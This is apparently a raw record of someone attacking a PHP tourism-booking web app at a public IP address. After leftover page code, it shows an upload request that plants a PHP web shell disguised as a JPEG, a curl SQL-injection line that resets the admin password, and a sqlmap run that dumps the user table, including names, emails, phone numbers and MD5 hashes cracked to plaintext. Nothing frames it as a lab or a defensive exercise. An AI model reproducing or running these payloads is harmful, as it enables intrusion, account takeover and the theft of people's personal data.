+								$(".page-container").removeClass("sidebar-collapsed").addClass("sidebar-collapsed-back");
+								setTimeout(function() {
+								  $("#menu span").css({"position":"relative"});
+								}, 400);
+							  }
+											
+											toggle = !toggle;
+										});
+							</script>
+<!--js -->
+<script src="js/jquery.nicescroll.js"></script>
+<script src="js/scripts.js"></script>
+<!-- Bootstrap Core JavaScript -->
+   <script src="js/bootstrap.min.js"></script>
+   <!-- /Bootstrap Core JavaScript -->	   
+<!-- morris JavaScript -->	
+<script src="js/raphael-min.js"></script>
+<script src="js/morris.js"></script>
+<script>
+	$(document).ready(function() {
+		//BOX BUTTON SHOW AND CLOSE
+	   jQuery('.small-graph-box').hover(function() {
+		  jQuery(this).find('.box-button').fadeIn('fast');
+	   }, function() {
+		  jQuery(this).find('.box-button').fadeOut('fast');
+	   });
+	   jQuery('.small-graph-box .box-close').click(function() {
+		  jQuery(this).closest('.small-graph-box').fadeOut(200);
+		  return false;
+	   });
+	   
+	    //CHARTS
+	    function gd(year, day, month) {
+			return new Date(year, month - 1, day).getTime();
+		}
+		
+		graphArea2 = Morris.Area({
+			element: 'hero-area',
+			padding: 10,
+        behaveLikeLine: true,
+        gridEnabled: false,
+        gridLineColor: '#dddddd',
+        axes: true,
+        resize: true,
+        smooth:true,
+        pointSize: 0,
+        lineWidth: 0,
+        fillOpacity:0.85,
+			data: [
+				{period: '2014 Q1', iphone: 2668, ipad: null, itouch: 2649},
+				{period: '2014 Q2', iphone: 15780, ipad: 13799, itouch: 12051},
+				{period: '2014 Q3', iphone: 12920, ipad: 10975, itouch: 9910},
+				{period: '2014 Q4', iphone: 8770, ipad: 6600, itouch: 6695},
+				{period: '2015 Q1', iphone: 10820, ipad: 10924, itouch: 12300},
+				{period: '2015 Q2', iphone: 9680, ipad: 9010, itouch: 7891},
+				{period: '2015 Q3', iphone: 4830, ipad: 3805, itouch: 1598},
+				{period: '2015 Q4', iphone: 15083, ipad: 8977, itouch: 5185},
+				{period: '2016 Q1', iphone: 10697, ipad: 4470, itouch: 2038},
+				{period: '2016 Q2', iphone: 8442, ipad: 5723, itouch: 1801}
+			],
+			lineColors:['#ff4a43','#a2d200','#22beef'],
+			xkey: 'period',
+            redraw: true,
+            ykeys: ['iphone', 'ipad', 'itouch'],
+            labels: ['All Visitors', 'Returning Visitors', 'Unique Visitors'],
+			pointSize: 2,
+			hideHover: 'auto',
+			resize: true
+		});
+		
+	   
+	});
+	</script>
+</body>
+</html>Tourism Management System
+
+Welcome
+
+Administrator
+HomeManage Users
+Manage Users
+#	Name	Mobile No.	Email Id	RegDate	Updation Date	Action
+1	Manju Srivatav	4456464654	manju@gmail.com	2025-10-10 06:33:20	2025-11-04 17:59:41	
+2	Kishan	9871987979	kishan@gmail.com	2025-10-10 06:33:20	2025-11-04 17:59:49	
+3	Salvi Chandra	1398756416	salvi@gmail.com	2025-10-10 06:33:20	2025-11-04 17:59:49	
+4	Abir	4789756456	abir@gmail.com	2025-10-10 06:33:20	2025-11-04 17:59:49	
+5	Test	1987894654	test@gmail.com	2025-10-10 06:33:20	2025-11-04 17:59:49	
+6	Test Sample	4654654564	testsample@gmail.com	2025-10-10 06:33:20	2025-11-04 17:59:49	
+7	Garima Singh	1425362540	garima12@gmail.com	2025-10-10 06:33:20	2025-11-04 17:59:49	
+TMS. All Rights Reserved | TMS
+
+Dashboard
+Tour Packages
+Manage Users
+Manage Booking
+Manage Issues
+Manage Enquiries
+Manage Pages
+what else can i ffuf here
+
+
+POST /tms/admin/create-package.php HTTP/1.1
+Host: 104.156.254.36
+Content-Length: 946
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://104.156.254.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKUL7Bd68WgzYvraV
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://104.156.254.36/tms/admin/create-package.php
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=s6bvpvoh4dna5o5ck2krp0ckdf
+Connection: keep-alive
+
+------WebKitFormBoundaryKUL7Bd68WgzYvraV
+Content-Disposition: form-data; name="packagename"
+
+shell
+------WebKitFormBoundaryKUL7Bd68WgzYvraV
+Content-Disposition: form-data; name="packagetype"
+
+shell
+------WebKitFormBoundaryKUL7Bd68WgzYvraV
+Content-Disposition: form-data; name="packagelocation"
+
+shell
+------WebKitFormBoundaryKUL7Bd68WgzYvraV
+Content-Disposition: form-data; name="packageprice"
+
+33
+------WebKitFormBoundaryKUL7Bd68WgzYvraV
+Content-Disposition: form-data; name="packagefeatures"
+
+shell
+------WebKitFormBoundaryKUL7Bd68WgzYvraV
+Content-Disposition: form-data; name="packagedetails"
+
+shell
+------WebKitFormBoundaryKUL7Bd68WgzYvraV
+Content-Disposition: form-data; name="packageimage"; filename="shell.php.jpg"
+Content-Type: image/jpeg
+
+<?php system($_GET["cmd"]); ?>
+
+------WebKitFormBoundaryKUL7Bd68WgzYvraV
+Content-Disposition: form-data; name="submit"
+
+
+------WebKitFormBoundaryKUL7Bd68WgzYvraV--
+HTTP/1.0 500 Internal Server Error
+Date: Sun, 30 Aug 2026 12:39:50 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+
+           curl -s "http://104.156.254.36/tms/admin/index.php" \
+  -d "username=admin';UPDATE admin SET Password=MD5('admin') WHERE UserName='admin'#&password=x&login=Sign+In"  this worked now i did admin admin 
+  
+  
+  
+                                                                  
+┌──(guts㉿kali)-[~]
+└─$ # Instead of dumping everything, target just the TMS database
+sqlmap -u "http://104.156.254.36/tms/admin/index.php" \
+  --data="username=admin&password=admin&login=Sign In" \
+  -p username \
+  --cookie="PHPSESSID=s6bvpvoh4dna5o5ck2krp0ckdf" \
+  --batch \
+  -D tms \
+  --dump-all \
+  --threads=10
+        ___
+       __H__                                                      
+ ___ ___[']_____ ___ ___  {1.10.6#stable}                         
+|_ -| . [)]     | .'| . |                                         
+|___|_  [,]_|_|_|__,|  _|                                         
+      |_|V...       |_|   https://sqlmap.org                      
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:46:40 /2026-08-30/
+
+[18:46:40] [INFO] resuming back-end DBMS 'mysql' 
+[18:46:41] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: username=admin' AND 9132=(SELECT (CASE WHEN (9132=9132) THEN 9132 ELSE (SELECT 1036 UNION SELECT 8030) END))-- PILt&password=admin&login=Sign In
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: username=admin';SELECT SLEEP(5)#&password=admin&login=Sign In
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 8178 FROM (SELECT(SLEEP(5)))PyAU)-- mfQi&password=admin&login=Sign In
+---
+[18:46:41] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 22.04 (jammy)
+web application technology: Apache 2.4.52
+back-end DBMS: MySQL >= 5.0.12
+[18:46:41] [INFO] fetching tables for database: 'tms'
+[18:46:41] [INFO] fetching number of tables for database 'tms'
+[18:46:41] [INFO] resumed: 7
+[18:46:41] [INFO] retrieving the length of query output
+[18:46:41] [INFO] retrieved: 5
+[18:46:44] [INFO] resumed: admin
+[18:46:44] [INFO] retrieving the length of query output
+[18:46:44] [INFO] retrieved: 10
+[18:46:47] [INFO] resumed: tblbooking
+[18:46:47] [INFO] retrieving the length of query output
+[18:46:47] [INFO] retrieved: 10
+[18:46:51] [INFO] resumed: tblenquiry
+[18:46:51] [INFO] retrieving the length of query output
+[18:46:51] [INFO] retrieved: 10
+[18:46:55] [INFO] resumed: tblissues
+[18:46:55] [INFO] retrieving the length of query output
+[18:46:55] [INFO] retrieved: 9
+[18:46:58] [INFO] resumed: tblpages
+[18:46:58] [INFO] retrieving the length of query output
+[18:46:58] [INFO] retrieved: 8
+[18:47:00] [INFO] resumed: tbltourpackages
+[18:47:00] [INFO] retrieving the length of query output
+[18:47:00] [INFO] retrieved: 15
+[18:47:04] [INFO] resumed: tblusers
+[18:47:04] [INFO] fetching columns for table 'tblpages' in database 'tms'
+[18:47:04] [INFO] retrieved: 3
+[18:47:07] [INFO] retrieving the length of query output
+[18:47:07] [INFO] retrieved: 2
+[18:47:12] [INFO] retrieved: id           
+[18:47:12] [INFO] retrieving the length of query output
+[18:47:12] [INFO] retrieved: 4
+[18:47:19] [INFO] retrieved: type           
+[18:47:19] [INFO] retrieving the length of query output
+[18:47:19] [INFO] retrieved: 6
+[18:47:26] [INFO] retrieved: detail           
+[18:47:26] [INFO] fetching entries for table 'tblpages' in database 'tms'
+[18:47:26] [INFO] fetching number of entries for table 'tblpages' in database 'tms'
+[18:47:26] [INFO] retrieved: 4
+[18:47:28] [INFO] retrieving the length of query output
+[18:47:28] [INFO] retrieved: 5
+[18:47:35] [INFO] retrieved: terms           
+[18:47:35] [INFO] retrieving the length of query output
+[18:47:35] [INFO] retrieved: 171
+[18:48:47] [INFO] retrieved:                     <p align="justify"><span style="color: rgb(153, 0, 0); font-size: small; font-weight: 700;">terms and condition page</span></p>                        
+[18:48:47] [INFO] retrieving the length of query output
+[18:48:47] [INFO] retrieved: 1
+[18:48:49] [INFO] retrieved: 1
+[18:48:52] [INFO] retrieving the length of query output
+[18:48:52] [INFO] retrieved: 7
+[18:48:58] [INFO] retrieved: privacy           
+[18:48:58] [INFO] retrieving the length of query output
+[18:48:58] [INFO] retrieved: 1000
+[18:54:54] [INFO] retrieved: ..</span>                            [18:54:54] [INFO] retrieved:           <span style="color: rgb(0, 0, 0); font-family: &quot;Open Sans&quot;, Arial, sans-serif; font-size: 14px; text-align: justify;">At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis praesentium voluptatum deleniti atque corrupti quos dolores et quas molestias excepturi sint occaecati cupiditate non provident, similique sunt in culpa qui officia deserunt mollitia animi, id est laborum et dolorum fuga. Et harum quidem rerum facilis est et expedita distinctio. Nam libero tempore, cum soluta nobis est eligendi optio cumque nihil impedit quo minus id quod maxime placeat facere possimus, omnis voluptas assumenda est, omnis dolor repellendus. Temporibus autem quibusdam et aut officiis debitis aut rerum necessitatibus saepe eveniet ut et voluptates repudiandae sint et molestiae non recusandae. Itaque earum rerum hic tenetur a sapiente delectus, ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat</span>            
+[18:54:54] [INFO] retrieving the length of query output
+[18:54:54] [INFO] retrieved: 1
+[18:54:56] [INFO] retrieved: 2
+[18:54:59] [INFO] retrieving the length of query output
+[18:54:59] [INFO] retrieved: 7
+[18:55:06] [INFO] retrieved: aboutus           
+[18:55:06] [INFO] retrieving the length of query output
+[18:55:06] [INFO] retrieved: 917
+[19:00:43] [INFO] retrieved:           <div><span style="color: rgb(0, 0, 0); font-family: Georgia; font-size: 15px; text-align: justify; font-weight: bold;">Welcome to Tourism Management System!!!</span></div><span style="font-family: &quot;courier new&quot;;"><span style="color: rgb(0, 0, 0); font-size: 15px; text-align: justify;">Since then, our courteous and committed team members have always ensured a pleasant and enjoyable tour for the clients. This arduous effort has enabled TMS to be recognized as a dependable Travel Solutions provider with three offices Delhi.</span><span style="color: rgb(80, 80, 80); font-size: 13px;">&nbsp;We have got packages to suit the discerning traveler's budget and savor. Book your dream vacation online. Supported quality and proposals of our travel consultants, we have a tendency to welcome you to decide on from holidays packages and customize them according to your plan.</span></span>            
+[19:00:43] [INFO] retrieving the length of query output
+[19:00:43] [INFO] retrieved: 1
+[19:00:45] [INFO] retrieved: 3
+[19:00:48] [INFO] retrieving the length of query output
+[19:00:48] [INFO] retrieved: 7
+[19:00:55] [INFO] retrieved: contact           
+[19:00:55] [INFO] retrieving the length of query output
+[19:00:55] [INFO] retrieved: 203
+[19:02:19] [INFO] retrieved:                     <span style="color: rgb(0, 0, 0); font-family: &quot;Open Sans&quot;, Arial, sans-serif; font-size: 14px; text-align: justify;">Address------J-890 Dwarka House New Delhi-110096</span>
+[19:02:19] [INFO] retrieving the length of query output
+[19:02:19] [INFO] retrieved: 2
+[19:02:24] [INFO] retrieved: 11           
+Database: tms
+Table: tblpages
+[4 entries]
++----+---------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| id | type    | detail                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
++----+---------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 1  | terms   | \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<p align="justify"><span style="color: rgb(153, 0, 0); font-size: small; font-weight: 700;">terms and condition page</span></p>\r\n\t\t\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\t\t\t                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
+| 2  | privacy | \t\t\t\t\t\t\t\t\t\t<span style="color: rgb(0, 0, 0); font-family: &quot;Open Sans&quot;, Arial, sans-serif; font-size: 14px; text-align: justify;">At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis praesentium voluptatum deleniti atque corrupti quos dolores et quas molestias excepturi sint occaecati cupiditate non provident, similique sunt in culpa qui officia deserunt mollitia animi, id est laborum et dolorum fuga. Et harum quidem rerum facilis est et expedita distinctio. Nam libero tempore, cum soluta nobis est eligendi optio cumque nihil impedit quo minus id quod maxime placeat facere possimus, omnis voluptas assumenda est, omnis dolor repellendus. Temporibus autem quibusdam et aut officiis debitis aut rerum necessitatibus saepe eveniet ut et voluptates repudiandae sint et molestiae non recusandae. Itaque earum rerum hic tenetur a sapiente delectus, ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat</span>\r\n\t\t\t\t\t\t\t\t\t\t |
+| 3  | aboutus | \t\t\t\t\t\t\t\t\t\t<div><span style="color: rgb(0, 0, 0); font-family: Georgia; font-size: 15px; text-align: justify; font-weight: bold;">Welcome to Tourism Management System!!!</span></div><span style="font-family: &quot;courier new&quot;;"><span style="color: rgb(0, 0, 0); font-size: 15px; text-align: justify;">Since then, our courteous and committed team members have always ensured a pleasant and enjoyable tour for the clients. This arduous effort has enabled TMS to be recognized as a dependable Travel Solutions provider with three offices Delhi.</span><span style="color: rgb(80, 80, 80); font-size: 13px;">&nbsp;We have got packages to suit the discerning traveler's budget and savor. Book your dream vacation online. Supported quality and proposals of our travel consultants, we have a tendency to welcome you to decide on from holidays packages and customize them according to your plan.</span></span>\r\n\t\t\t\t\t\t\t\t\t\t                                                                                    |
+| 11 | contact | \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<span style="color: rgb(0, 0, 0); font-family: &quot;Open Sans&quot;, Arial, sans-serif; font-size: 14px; text-align: justify;">Address------J-890 Dwarka House New Delhi-110096</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
++----+---------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+[19:02:24] [INFO] table 'tms.tblpages' dumped to CSV file '/home/guts/.local/share/sqlmap/output/104.156.254.36/dump/tms/tblpages.csv'                                                                
+[19:02:24] [INFO] fetching columns for table 'tblusers' in database 'tms'
+[19:02:24] [INFO] retrieved: 7
+[19:02:27] [INFO] retrieving the length of query output
+[19:02:27] [INFO] retrieved: 2
+[19:02:32] [INFO] retrieved: id           
+[19:02:32] [INFO] retrieving the length of query output
+[19:02:32] [INFO] retrieved: 8
+[19:02:40] [INFO] retrieved: FullName           
+[19:02:40] [INFO] retrieving the length of query output
+[19:02:40] [INFO] retrieved: 12
+[19:02:50] [INFO] retrieved: MobileNumber             
+[19:02:50] [INFO] retrieving the length of query output
+[19:02:50] [INFO] retrieved: 7
+[19:02:58] [INFO] retrieved: EmailId           
+[19:02:58] [INFO] retrieving the length of query output
+[19:02:58] [INFO] retrieved: 8
+[19:03:05] [INFO] retrieved: Password           
+[19:03:05] [INFO] retrieving the length of query output
+[19:03:05] [INFO] retrieved: 7
+[19:03:10] [INFO] retrieved: RegDate           
+[19:03:10] [INFO] retrieving the length of query output
+[19:03:10] [INFO] retrieved: 12
+[19:03:18] [INFO] retrieved: UpdationDate             
+[19:03:18] [INFO] fetching entries for table 'tblusers' in database 'tms'
+[19:03:18] [INFO] fetching number of entries for table 'tblusers' in database 'tms'
+[19:03:18] [INFO] retrieved: 7
+[19:03:20] [INFO] retrieving the length of query output
+[19:03:20] [INFO] retrieved: 15
+[19:03:31] [INFO] retrieved: manju@gmail.com             
+[19:03:31] [INFO] retrieving the length of query output
+[19:03:31] [INFO] retrieved: 14
+[19:03:42] [INFO] retrieved: Manju Srivatav             
+[19:03:42] [INFO] retrieving the length of query output
+[19:03:42] [INFO] retrieved: 10
+[19:03:49] [INFO] retrieved: 4456464654             
+[19:03:49] [INFO] retrieving the length of query output
+[19:03:49] [INFO] retrieved: 32
+[19:04:08] [INFO] retrieved: 202cb962ac59075b964b07152d234b70  
+[19:04:08] [INFO] retrieving the length of query output
+[19:04:08] [INFO] retrieved: 19
+[19:04:21] [INFO] retrieved: 2025-10-10 06:33:20             
+[19:04:21] [INFO] retrieving the length of query output
+[19:04:21] [INFO] retrieved: 19
+[19:04:35] [INFO] retrieved: 2025-11-04 17:59:41             
+[19:04:35] [INFO] retrieving the length of query output
+[19:04:35] [INFO] retrieved: 1
+[19:04:37] [INFO] retrieved: 1
+[19:04:40] [INFO] retrieving the length of query output
+[19:04:40] [INFO] retrieved: 16
+[19:04:51] [INFO] retrieved: kishan@gmail.com             
+[19:04:51] [INFO] retrieving the length of query output
+[19:04:51] [INFO] retrieved: 6
+[19:04:57] [INFO] retrieved: Kishan           
+[19:04:57] [INFO] retrieving the length of query output
+[19:04:57] [INFO] retrieved: 10
+[19:05:05] [INFO] retrieved: 9871987979             
+[19:05:05] [INFO] retrieving the length of query output
+[19:05:05] [INFO] retrieved: 32
+[19:05:23] [INFO] retrieved: 202cb962ac59075b964b07152d234b70  
+[19:05:23] [INFO] retrieving the length of query output
+[19:05:23] [INFO] retrieved: 19
+[19:05:35] [INFO] retrieved: 2025-10-10 06:33:20             
+[19:05:35] [INFO] retrieving the length of query output
+[19:05:35] [INFO] retrieved: 19
+[19:05:48] [INFO] retrieved: 2025-11-04 17:59:49             
+[19:05:48] [INFO] retrieving the length of query output
+[19:05:48] [INFO] retrieved: 1
+[19:05:50] [INFO] retrieved: 2
+[19:05:53] [INFO] retrieving the length of query output
+[19:05:53] [INFO] retrieved: 15
+[19:06:04] [INFO] retrieved: salvi@gmail.com             
+[19:06:04] [INFO] retrieving the length of query output
+[19:06:04] [INFO] retrieved: 13
+[19:06:15] [INFO] retrieved: Salvi Chandra             
+[19:06:15] [INFO] retrieving the length of query output
+[19:06:15] [INFO] retrieved: 10
+[19:06:23] [INFO] retrieved: 1398756416             
+[19:06:23] [INFO] retrieving the length of query output
+[19:06:23] [INFO] retrieved: 32
+[19:06:41] [INFO] retrieved: 202cb962ac59075b964b07152d234b70  
+[19:06:41] [INFO] retrieving the length of query output
+[19:06:41] [INFO] retrieved: 19
+[19:06:53] [INFO] retrieved: 2025-10-10 06:33:20             
+[19:06:53] [INFO] retrieving the length of query output
+[19:06:53] [INFO] retrieved: 19
+[19:07:05] [INFO] retrieved: 2025-11-04 17:59:49             
+[19:07:05] [INFO] retrieving the length of query output
+[19:07:05] [INFO] retrieved: 1
+[19:07:08] [INFO] retrieved: 3
+[19:07:10] [INFO] retrieving the length of query output
+[19:07:10] [INFO] retrieved: 14
+[19:07:21] [INFO] retrieved: abir@gmail.com             
+[19:07:21] [INFO] retrieving the length of query output
+[19:07:21] [INFO] retrieved: 4
+[19:07:30] [INFO] retrieved: Abir           
+[19:07:30] [INFO] retrieving the length of query output
+[19:07:30] [INFO] retrieved: 10
+[19:07:38] [INFO] retrieved: 4789756456             
+[19:07:38] [INFO] retrieving the length of query output
+[19:07:38] [INFO] retrieved: 32
+[19:07:56] [INFO] retrieved: 202cb962ac59075b964b07152d234b70  
+[19:07:56] [INFO] retrieving the length of query output
+[19:07:56] [INFO] retrieved: 19
+[19:08:08] [INFO] retrieved: 2025-10-10 06:33:20             
+[19:08:08] [INFO] retrieving the length of query output
+[19:08:08] [INFO] retrieved: 19
+[19:08:25] [INFO] retrieved: 2025-11-04 17:59:49             
+[19:08:25] [INFO] retrieving the length of query output
+[19:08:25] [INFO] retrieved: 1
+[19:08:28] [INFO] retrieved: 4
+[19:08:31] [INFO] retrieving the length of query output
+[19:08:31] [INFO] retrieved: 14
+[19:08:43] [INFO] retrieved: test@gmail.com             
+[19:08:43] [INFO] retrieving the length of query output
+[19:08:43] [INFO] retrieved: 4
+[19:08:49] [INFO] retrieved: Test           
+[19:08:49] [INFO] retrieving the length of query output
+[19:08:49] [INFO] retrieved: 10
+[19:08:57] [INFO] retrieved: 1987894654             
+[19:08:57] [INFO] retrieving the length of query output
+[19:08:57] [INFO] retrieved: 32
+[19:09:16] [INFO] retrieved: f925916e2754e5e03f75dd58a5733251  
+[19:09:16] [INFO] retrieving the length of query output
+[19:09:16] [INFO] retrieved: 19
+[19:09:29] [INFO] retrieved: 2025-10-10 06:33:20             
+[19:09:29] [INFO] retrieving the length of query output
+[19:09:29] [INFO] retrieved: 19
+[19:09:45] [INFO] retrieved: 2025-11-04 17:59:49             
+[19:09:45] [INFO] retrieving the length of query output
+[19:09:45] [INFO] retrieved: 1
+[19:09:47] [INFO] retrieved: 5
+[19:09:49] [INFO] retrieving the length of query output
+[19:09:49] [INFO] retrieved: 20
+[19:10:02] [INFO] retrieved: testsample@gmail.com             
+[19:10:02] [INFO] retrieving the length of query output
+[19:10:02] [INFO] retrieved: 11
+[19:10:11] [INFO] retrieved: Test Sample             
+[19:10:11] [INFO] retrieving the length of query output
+[19:10:11] [INFO] retrieved: 10
+[19:10:19] [INFO] retrieved: 4654654564             
+[19:10:19] [INFO] retrieving the length of query output
+[19:10:19] [INFO] retrieved: 32
+[19:10:38] [INFO] retrieved: 202cb962ac59075b964b07152d234b70  
+[19:10:38] [INFO] retrieving the length of query output
+[19:10:38] [INFO] retrieved: 19
+[19:10:51] [INFO] retrieved: 2025-10-10 06:33:20             
+[19:10:51] [INFO] retrieving the length of query output
+[19:10:51] [INFO] retrieved: 19
+[19:11:04] [INFO] retrieved: 2025-11-04 17:59:49             
+[19:11:04] [INFO] retrieving the length of query output
+[19:11:04] [INFO] retrieved: 1
+[19:11:06] [INFO] retrieved: 9
+[19:11:09] [INFO] retrieving the length of query output
+[19:11:09] [INFO] retrieved: 18
+[19:11:20] [INFO] retrieved: garima12@gmail.com             
+[19:11:20] [INFO] retrieving the length of query output
+[19:11:20] [INFO] retrieved: 12
+[19:11:30] [INFO] retrieved: Garima Singh             
+[19:11:30] [INFO] retrieving the length of query output
+[19:11:30] [INFO] retrieved: 10
+[19:11:38] [INFO] retrieved: 1425362540             
+[19:11:38] [INFO] retrieving the length of query output
+[19:11:38] [INFO] retrieved: 32
+[19:11:56] [INFO] retrieved: f925916e2754e5e03f75dd58a5733251  
+[19:11:56] [INFO] retrieving the length of query output
+[19:11:56] [INFO] retrieved: 19
+[19:12:08] [INFO] retrieved: 2025-10-10 06:33:20             
+[19:12:08] [INFO] retrieving the length of query output
+[19:12:08] [INFO] retrieved: 19
+[19:12:22] [INFO] retrieved: 2025-11-04 17:59:49             
+[19:12:22] [INFO] retrieving the length of query output
+[19:12:22] [INFO] retrieved: 2
+[19:12:27] [INFO] retrieved: 10           
+[19:12:27] [INFO] recognized possible password hashes in column 'Password'                                                          
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+do you want to crack them via a dictionary-based attack? [Y/n/q] Y
+[19:12:27] [INFO] using hash method 'md5_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 1
+[19:12:27] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] N
+[19:12:27] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[19:12:27] [INFO] starting 4 processes 
+[19:12:28] [INFO] cracked password '123' for hash '202cb962ac59075b964b07152d234b70'                                                
+Database: tms                                                    
+Table: tblusers
+[7 entries]
++----+----------------------+---------------------+----------------+----------------------------------------+--------------+---------------------+
+| id | EmailId              | RegDate             | FullName       | Password                               | MobileNumber | UpdationDate        |
++----+----------------------+---------------------+----------------+----------------------------------------+--------------+---------------------+
+| 1  | manju@gmail.com      | 2025-10-10 06:33:20 | Manju Srivatav | 202cb962ac59075b964b07152d234b70 (123) | 4456464654   | 2025-11-04 17:59:41 |
+| 2  | kishan@gmail.com     | 2025-10-10 06:33:20 | Kishan         | 202cb962ac59075b964b07152d234b70 (123) | 9871987979   | 2025-11-04 17:59:49 |
+| 3  | salvi@gmail.com      | 2025-10-10 06:33:20 | Salvi Chandra  | 202cb962ac59075b964b07152d234b70 (123) | 1398756416   | 2025-11-04 17:59:49 |
+| 4  | abir@gmail.com       | 2025-10-10 06:33:20 | Abir           | 202cb962ac59075b964b07152d234b70 (123) | 4789756456   | 2025-11-04 17:59:49 |
+| 5  | test@gmail.com       | 2025-10-10 06:33:20 | Test           | f925916e2754e5e03f75dd58a5733251       | 1987894654   | 2025-11-04 17:59:49 |
+| 9  | testsample@gmail.com | 2025-10-10 06:33:20 | Test Sample    | 202cb962ac59075b964b07152d234b70 (123) | 4654654564   | 2025-11-04 17:59:49 |
+| 10 | garima12@gmail.com   | 2025-10-10 06:33:20 | Garima Singh   | f925916e2754e5e03f75dd58a5733251       | 1425362540   | 2025-11-04 17:59:49 |
++----+----------------------+---------------------+----------------+----------------------------------------+--------------+---------------------+
+
+[19:12:38] [INFO] table 'tms.tblusers' dumped to CSV file '/home/guts/.local/share/sqlmap/output/104.156.254.36/dump/tms/tblusers.csv'                                                                
+[19:12:38] [INFO] fetching columns for table 'tblenquiry' in database 'tms'
+[19:12:38] [INFO] retrieved: 8
+[19:12:40] [INFO] retrieving the length of query output
+[19:12:40] [INFO] retrieved: 2
+[19:12:46] [INFO] retrieved: id           
+[19:12:46] [INFO] retrieving the length of query output
+[19:12:46] [INFO] retrieved: 8
+[19:12:53] [INFO] retrieved: FullName           
+[19:12:53] [INFO] retrieving the length of query output
+[19:12:53] [INFO] retrieved: 7
+[19:13:00] [INFO] retrieved: EmailId           
+[19:13:00] [INFO] retrieving the length of query output
+[19:13:00] [INFO] retrieved: 12
+[19:13:10] [INFO] retrieved: MobileNumber             
